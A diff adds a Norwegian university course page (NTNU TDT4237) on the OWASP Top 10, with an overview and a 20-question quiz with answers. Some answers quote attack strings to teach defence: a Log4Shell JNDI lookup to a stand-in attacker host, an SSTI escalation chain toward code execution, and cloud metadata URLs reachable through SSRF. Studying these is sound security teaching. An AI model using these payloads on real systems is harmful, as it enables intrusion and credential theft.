@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kapittel 2 — OWASP Top 10</title>
+<link rel="stylesheet" href="../style.css">
+<link rel="icon" type="image/png" href="../favicon.png">
+</head>
+<body>
+<nav class="site-nav">
+  <div class="container">
+    <a href="../" class="brand">TDT4237</a>
+    <a href="../" class="nav-back">&larr; Alle kapitler</a>
+    <div class="nav-search-wrapper">
+      <svg class="nav-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <input type="text" id="nav-search" placeholder="Laster…" autocomplete="off" disabled>
+      <div id="nav-search-results"></div>
+    </div>
+  </div>
+</nav>
+
+<main data-chapter="Kapittel 2: OWASP Top 10">
+<header class="hero">
+  <div class="container">
+    <div class="eyebrow">Kapittel 2 · Vanlige sårbarheter</div>
+    <h1>OWASP <em>Top 10</em></h1>
+    <p class="lede">Ti kategorier av sårbarhetsfeil som dukker opp igjen og igjen — ikke fordi de er kompliserte, men fordi de er enkle å glemme.</p>
+  </div>
+</header>
+
+<nav class="chapter-toc">
+  <div class="container">
+    <ol class="chapter-toc-list">
+      <li><span class="toc-num">01</span><a href="#overblikk">Helhetsbilde</a></li>
+      <li><span class="toc-num">02</span><a href="#deler">Delsider</a></li>
+      <li><span class="toc-num">03</span><a href="#quiz">Test deg selv</a></li>
+    </ol>
+  </div>
+</nav>
+
+<section id="overblikk">
+  <div class="container">
+    <div class="section-badge">Overblikk</div>
+    <h2>Det store <em>bildet</em></h2>
+    <p class="section-intro">OWASP Top 10 er ikke en uttømmende liste over alle sårbarheter — det er en empirisk liste over de som koster mest.</p>
+    <p class="lead">OWASP — Open Worldwide Application Security Project — er en ideell organisasjon som siden 2003 har publisert oversikter over de vanligste og farligste sårbarhetene i webapplikasjoner. Listen oppdateres hvert tredje til femte år basert på data fra hundrevis av organisasjoner og millioner av applikasjoner. Den er ikke en fasit, men den er det nærmeste bransjen har kommet en felles standard for hva som faktisk går galt.</p>
+
+    <figure class="fig-frame">
+      <svg viewBox="0 0 720 360" xmlns="http://www.w3.org/2000/svg" font-family="IBM Plex Sans, sans-serif">
+        <!-- OWASP Top 10 som horisontale bånd -->
+        <rect x="60" y="30" width="600" height="28" rx="2" fill="rgba(176,68,40,0.18)" stroke="#b04428" stroke-width="1"/>
+        <text x="70" y="49" font-size="12" fill="#b04428" font-weight="600">A01 Broken Access Control</text>
+        <rect x="60" y="65" width="560" height="28" rx="2" fill="rgba(176,68,40,0.13)" stroke="#b04428" stroke-width="1"/>
+        <text x="70" y="84" font-size="12" fill="#b04428" font-weight="600">A02 Cryptographic Failures</text>
+        <rect x="60" y="100" width="520" height="28" rx="2" fill="rgba(176,68,40,0.1)" stroke="#b04428" stroke-width="1"/>
+        <text x="70" y="119" font-size="12" fill="#b04428" font-weight="600">A03 Injection</text>
+        <rect x="60" y="135" width="480" height="28" rx="2" fill="rgba(45,74,122,0.12)" stroke="#2d4a7a" stroke-width="1"/>
+        <text x="70" y="154" font-size="12" fill="#2d4a7a" font-weight="600">A04 Insecure Design</text>
+        <rect x="60" y="170" width="440" height="28" rx="2" fill="rgba(45,74,122,0.1)" stroke="#2d4a7a" stroke-width="1"/>
+        <text x="70" y="189" font-size="12" fill="#2d4a7a" font-weight="600">A05 Security Misconfiguration</text>
+        <rect x="60" y="205" width="400" height="28" rx="2" fill="rgba(45,74,122,0.08)" stroke="#2d4a7a" stroke-width="1"/>
+        <text x="70" y="224" font-size="12" fill="#2d4a7a" font-weight="600">A06 Vulnerable Components</text>
+        <rect x="60" y="240" width="360" height="28" rx="2" fill="rgba(61,107,58,0.1)" stroke="#3d6b3a" stroke-width="1"/>
+        <text x="70" y="259" font-size="12" fill="#3d6b3a" font-weight="600">A07 Identification &amp; Auth Failures</text>
+        <rect x="60" y="275" width="320" height="28" rx="2" fill="rgba(61,107,58,0.08)" stroke="#3d6b3a" stroke-width="1"/>
+        <text x="70" y="294" font-size="12" fill="#3d6b3a" font-weight="600">A08 Software &amp; Data Integrity Failures</text>
+        <rect x="60" y="310" width="280" height="28" rx="2" fill="rgba(198,138,31,0.1)" stroke="#c68a1f" stroke-width="1"/>
+        <text x="70" y="329" font-size="12" fill="#c68a1f" font-weight="600">A09 Security Logging Failures</text>
+        <!-- A10 -->
+        <rect x="60" y="345" width="240" height="28" rx="2" fill="rgba(198,138,31,0.08)" stroke="#c68a1f" stroke-width="1"/>
+        <text x="70" y="364" font-size="12" fill="#c68a1f" font-weight="600">A10 SSRF</text>
+        <!-- x-akse label -->
+        <text x="660" y="370" font-size="11" fill="#a39886" text-anchor="end">← utbredelse</text>
+      </svg>
+      <figcaption>OWASP Top 10 (2021) rangert etter utbredelse — bredden på båndet indikerer relativ forekomst på tvers av applikasjoner.</figcaption>
+    </figure>
+
+    <p>Fire delsider dekker hele listen tematisk: <em>Injection</em> (A03) er en kategori for seg. XSS og CSRF grupperes fordi de begge utnytter tillitsrelasjonen mellom nettleseren og serveren. Broken access control og autentiseringsfeil deles fordi de begge handler om identitet og rettigheter. Konfigurasjonsfeil, kryptografiske feil, SSRF og sårbare komponenter samles i den siste delsiden.</p>
+
+    <div class="callout callout-green">
+      <h4>Kapittelets kjerneidé</h4>
+      <p>De fleste sårbarhetene i OWASP Top 10 handler ikke om avansert kryptografi eller eksotiske protokollfeil. De handler om å stole på input, glemme å sjekke tilganger og bruke gammel kode. Fixes er like enkle som feilene — men krever disiplin.</p>
+    </div>
+  </div>
+</section>
+
+<section id="deler">
+  <div class="container">
+    <div class="section-badge">Delsider</div>
+    <h2>Utforsk <em>kapittelet</em></h2>
+    <div class="subpage-list">
+      <a href="injection.html" class="subpage-card">
+        <div class="sp-icon">A03</div>
+        <div class="sp-info">
+          <div class="sp-title">Injection</div>
+          <div class="sp-desc">SQL injection, command injection og NoSQL-varianter — og den parameteriserte løsningen som fikser alle tre.</div>
+        </div>
+        <div class="sp-arrow">&rarr;</div>
+      </a>
+      <a href="xss-csrf.html" class="subpage-card">
+        <div class="sp-icon">XSS·CSRF</div>
+        <div class="sp-info">
+          <div class="sp-title">XSS og CSRF</div>
+          <div class="sp-desc">Skript som sitter i databasen og venter, og forespørsler nettleseren sender uten å spørre.</div>
+        </div>
+        <div class="sp-arrow">&rarr;</div>
+      </a>
+      <a href="authn-autorisasjonsfeil.html" class="subpage-card">
+        <div class="sp-icon">A01·A07</div>
+        <div class="sp-info">
+          <div class="sp-title">Broken access control og autentiseringsfeil</div>
+          <div class="sp-desc">IDOR, manglende serversidekontroller og svak autentisering — der identitet og tilgang kollapser.</div>
+        </div>
+        <div class="sp-arrow">&rarr;</div>
+      </a>
+      <a href="konfig-krypto-ssrf.html" class="subpage-card">
+        <div class="sp-icon">A02·A05·A06·A10</div>
+        <div class="sp-info">
+          <div class="sp-title">Konfigurasjon, krypto, komponenter og SSRF</div>
+          <div class="sp-desc">Default credentials, ECB-modus, Log4Shell og servere som henter URL-er de ikke burde.</div>
+        </div>
+        <div class="sp-arrow">&rarr;</div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<section id="quiz">
+  <div class="container">
+    <h2>Test deg <em>selv</em></h2>
+    <p class="section-intro">20 spørsmål — fra definisjon til angrepsscenario.</p>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 1 · Lett</div>
+      <div class="q-text">Hva er SQL injection?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">SQL injection er et angrep der en angriper setter inn ondsinnet SQL-kode i et inndatafelt som concateneres direkte inn i en SQL-spørring. Angriperen kan dermed manipulere spørringen for å hente ut data, endre data, eller kjøre vilkårlige kommandoer mot databasen.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 2 · Lett</div>
+      <div class="q-text">Hva er XSS?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">XSS (Cross-Site Scripting) er et angrep der ondsinnet JavaScript injiseres i en nettside og kjøres i offerets nettleser. Det kan brukes til å stjele cookies/sesjoner, omdirigere brukere, eller utføre handlinger på vegne av offeret.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 3 · Lett</div>
+      <div class="q-text">Hva er CSRF?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">CSRF (Cross-Site Request Forgery) er et angrep der en ondsinnet nettside lurer offerets nettleser til å sende en autentisert forespørsel til et annet nettsted der offeret allerede er innlogget. Nettleseren legger automatisk ved cookies, så serveren tror forespørselen er legitim.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 4 · Lett</div>
+      <div class="q-text">Hva er IDOR?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">IDOR (Insecure Direct Object Reference) er en broken access control-sårbarhet der en applikasjon bruker brukerkontrollerte inndataverdier (f.eks. <code>?user_id=42</code>) for å aksessere ressurser uten å verifisere at den innloggede brukeren faktisk har tilgang til ressursen med den ID-en.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 5 · Lett</div>
+      <div class="q-text">Hva er SSRF?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">SSRF (Server-Side Request Forgery) er et angrep der en angriper får en server til å hente en URL angriperen kontrollerer. Dette kan brukes til å nå interne tjenester (f.eks. 169.254.169.254 cloud metadata), porte-skanne interne nettverk, eller eksfiltrere data.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 6 · Lett</div>
+      <div class="q-text">Hva er forskjellen mellom stored og reflected XSS?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Stored XSS:</strong> det ondsinnede skriptet lagres i databasen og kjøres for alle brukere som ser det infiserte innholdet. <strong>Reflected XSS:</strong> skriptet sendes i URL-en eller forespørselen og «reflekteres» tilbake i svaret — offeret må lures til å klikke en spesialkonstruert lenke.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 7 · Lett</div>
+      <div class="q-text">Hva gjør <code>HttpOnly</code>-flagget på en cookie?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><code>HttpOnly</code> hindrer JavaScript i å lese cookien via <code>document.cookie</code>. Det er det viktigste enkeltforsvaret mot session-tyveri via XSS — selv om et XSS-angrep lykkes, kan ikke skriptet eksfiltrere session-cookien.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 8 · Middels</div>
+      <div class="q-text">Skriv en parameterisert SQL-spørring i Python som henter en bruker basert på e-post.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">Med <code>psycopg2</code>:<br><br><code>cursor.execute("SELECT * FROM users WHERE email = %s", (email,))</code><br><br>Parameteren sendes separat fra spørringsstrengen — driveren håndterer escaping. Aldri: <code>"SELECT * FROM users WHERE email = '" + email + "'"</code></div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 9 · Middels</div>
+      <div class="q-text">Hva er <code>SameSite=Strict</code> og hva beskytter det mot?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><code>SameSite=Strict</code> instruerer nettleseren om å aldri sende cookien med cross-site-forespørsler. Det er den sterkeste CSRF-beskyttelsen via cookie-attributt — en forespørsel utløst fra en annen domene vil aldri bære cookien. <code>SameSite=Lax</code> tillater top-level GET-navigasjon, <code>SameSite=None</code> tillater alt (krever Secure).</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 10 · Middels</div>
+      <div class="q-text">Forklar hvorfor ECB-modus er usikker for kryptering av meningsfull data.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">ECB (Electronic Codebook) krypterer hver blokk uavhengig med samme nøkkel. Identiske klartekstblokker gir identiske chiffertekstblokker — mønstre i dataene bevares. Det klassiske eksempelet er det krypterte ECB-pingvin-bildet, der omrisset av pingvinen er synlig i chifferteksten. For vilkårlige data avslører ECB repetisjon og struktur.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 11 · Middels</div>
+      <div class="q-text">Hva er Log4Shell-sårbarheten?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">Log4Shell (CVE-2021-44228) er en kritisk RCE-sårbarhet i Java-logging-biblioteket Log4j2. Biblioteket støttet JNDI-oppslag i loggmeldinger: ved å logge en streng som <code>${jndi:ldap://angriper.com/x}</code> utløste Log4j en nettverksforespørsel og lastet ned og kjørte vilkårlig Java-kode. Feilen rammet et enormt antall systemer fordi Log4j er transitiv avhengighet i svært mange Java-applikasjoner.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 12 · Middels</div>
+      <div class="q-text">Beskriv et IDOR-scenario og den serversidekontrollen som forhindrer det.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Scenario:</strong> en bruker med <code>user_id=42</code> sender <code>GET /api/invoices/100</code>. Faktura 100 tilhører <code>user_id=99</code>. Applikasjonen returnerer den uten å sjekke eierskap.<br><br><strong>Kontroll:</strong> <code>if invoice.owner_id != current_user.id: return 403</code> — alltid verifiser eierskap på serversiden, aldri stol på klient-sendte ID-er alene.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 13 · Middels</div>
+      <div class="q-text">Hva er en CSRF-token og hvordan fungerer den?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">En CSRF-token er en tilfeldig, uforutsigbar verdi som serveren genererer per sesjon (eller per forespørsel). Den legges i et skjult skjemafelt eller header. Ved mottak verifiserer serveren at tokenen matcher den lagrede. En ondsinnet tredjeparts-nettside kan ikke lese eller gjette tokenen (same-origin policy), og kan dermed ikke konstruere en gyldig forespørsel.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 14 · Middels</div>
+      <div class="q-text">Hva skjer hvis du validerer input kun på klientsiden?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">Klientsidevalidering er trivielt å omgå — angriperen bruker <code>curl</code>, Burp Suite eller modifiserer JavaScript i nettleseren. Klientsidevalidering er utelukkende en UX-forbedring. All sikkerhetsrelevant validering must skje på serversiden. Aldri stol på noe som kommer fra klienten.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 15 · Middels</div>
+      <div class="q-text">Forklar hva verbose feilmeldinger er og hvorfor det er et sikkerhetsproblem.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">Verbose feilmeldinger (f.eks. stack traces, SQL-feil med tabellnavn, filstiinformasjon) eksponeres mot brukeren og gir angriperen verdifull rekognoseringsinformasjon: teknologistakk, versjonsnumre, interne filsystier og logikken i applikasjonen. I produksjon skal feilmeldinger til brukeren alltid være generiske; detaljene skal logges internt.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 16 · Vanskelig</div>
+      <div class="q-text">En Flask-applikasjon bruker <code>render_template_string(user_input)</code>. Hva er angrepsvektoren og hva er riktig fix?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Angrepsvektor:</strong> Server-Side Template Injection (SSTI). Jinja2-maler evaluerer <code>{{ 7*7 }}</code> til <code>49</code>, og <code>{{ config.items() }}</code> eksponerer konfigurasjon. En angriper kan eskalere til RCE via <code>{{ ''.__class__.__mro__[1].__subclasses__()... }}</code>.<br><br><strong>Fix:</strong> Aldri rendre brukerkontrollert innhold som malstreng. Bruk <code>render_template('side.html', innhold=user_input)</code> med auto-escaping aktivert, og la Jinja2 behandle <code>innhold</code> som data, ikke kode.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 17 · Vanskelig</div>
+      <div class="q-text">Forklar forskjellen mellom stored og DOM-basert XSS og hvorfor CSP hjelper ulikt for begge.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Stored XSS</strong> kommer fra serveren — skriptet er i HTTP-svaret. En CSP som blokkerer <code>inline</code> skript og kun tillater scripts fra egne domener, vil blokkere de fleste stored XSS-angrep.<br><br><strong>DOM-basert XSS</strong> skjer helt i nettleseren — JavaScript leser fra <code>location.hash</code>, <code>document.referrer</code> o.l. og skriver til DOM uten å gå via serveren. CSP hjelper <em>delvis</em>: blokkerte eval og inline scripts beskytter noe, men DOM XSS via <code>innerHTML</code> fra interne scripts er vanskeligere å stoppe med CSP alene. Trusted Types er den sterkere løsningen for DOM-basert XSS.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 18 · Vanskelig</div>
+      <div class="q-text">SSRF mot en cloud-instans — hvilke data kan en angriper hente, og hva reduserer risikoen?</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><strong>Data angriperen kan hente:</strong> via <code>http://169.254.169.254/latest/meta-data/</code> på AWS kan angriperen lese IAM-tilgangsrolle-credentials, instans-ID, VPC-informasjon og potensielt hemmeligheter i user-data-feltet. På GCP er endepunktet <code>http://metadata.google.internal/computeMetadata/v1/</code>.<br><br><strong>Risikoreduksjon:</strong> (1) IMDSv2 (AWS) krever en PUT-forespørsel for å hente token, som blokkerer enkle SSRF; (2) blokkér trafikk til 169.254.169.254 på nettverksnivå; (3) valider og begrens URL-er tjenesten kan hente; (4) gi instansen minimal IAM-rolle.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 19 · Vanskelig</div>
+      <div class="q-text">Forklar hvorfor <code>SameSite=Lax</code> ikke er tilstrekkelig alene som CSRF-forsvar.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer"><code>SameSite=Lax</code> tillater cookies ved top-level GET-navigasjon (f.eks. å klikke en lenke). Angrep som utnytter state-endringer via GET-forespørsler (f.eks. <code>GET /admin/delete?id=42</code>) er fortsatt mulige. I tillegg: sub-domener er ikke beskyttet (cross-site, ikke cross-origin), og nyere nettlesere har edge cases. CSRF-tokens gir et sterkere, eksplisitt forsvar som ikke avhenger av nettleserens cookie-tolkning.</div></div>
+    </div>
+
+    <div class="quiz" data-quiz>
+      <div class="q-label">Spørsmål 20 · Vanskelig</div>
+      <div class="q-text">Et API eksponerer <code>/api/faktura/{id}</code>. Beskriv den komplette access-control-sjekken som må implementeres på serversiden.</div>
+      <div class="quiz-reveal"><button class="reveal-btn">Se svar</button>
+      <div class="answer">1. <strong>Autentisering:</strong> er brukeren innlogget og sesjonen gyldig? Hvis ikke → 401.<br>2. <strong>Autorisasjon — rollesjekk:</strong> har brukeren en rolle som tillater tilgang til faktura-ressurser? Hvis ikke → 403.<br>3. <strong>Autorisasjon — eiersjekk:</strong> eier denne spesifikke brukeren fakturaen med dette ID-et? Spørr databasen: <code>SELECT * FROM invoices WHERE id=? AND owner_id=current_user.id</code>. Returnerer ingenting → 403 (aldri 404, som avslører eksistens).<br>4. <strong>Rate limiting og logging:</strong> logg tilgangsforsøk, begrens kall per bruker for å hindre enumerering.</div></div>
+    </div>
+
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="ornament">&#10043; &#10043; &#10043;</div>
+    <p>NTNU · TDT4237 · Vår 2026</p>
+  </div>
+</footer>
+
+<script src="../chat-widget.js"></script>
+<script src="../nav-search.js"></script>
+<script src="../quiz.js"></script>
+</body>
+</html>
